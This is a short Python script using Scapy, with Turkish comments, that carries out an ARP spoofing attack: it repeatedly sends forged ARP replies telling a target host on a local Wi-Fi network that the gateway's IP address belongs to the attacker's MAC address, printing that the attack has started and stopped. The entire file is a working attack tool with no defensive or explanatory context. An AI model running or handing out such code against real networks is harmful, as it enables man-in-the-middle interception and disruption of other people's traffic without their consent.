#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
from scapy.all import *

conf.verb     = 0					           # Çıktıları kapatıyoruz

op     		  =  2 				           	 # ARP replay için tanımlana kod
attackerMAC   = 'c4:6e:1f:17:ed:b3'  # Saldırı yapacak cihazın MAC adresi
gateway       = '192.168.2.1'	    	 # Gateway IP adresi
hedefIP       = '192.168.2.48'       # Hedefin IP adresi

arp=ARP(op=op,psrc=gateway,pdst=hedefIP, hwsrc=attackerMAC)
print "ARP Saldırısı Başladı ... "
try:
	while 1:
		send(arp, iface='wlan0')
		time.sleep(2)

except KeyboardInterrupt:
	print "Saldırı Sonlandı" 
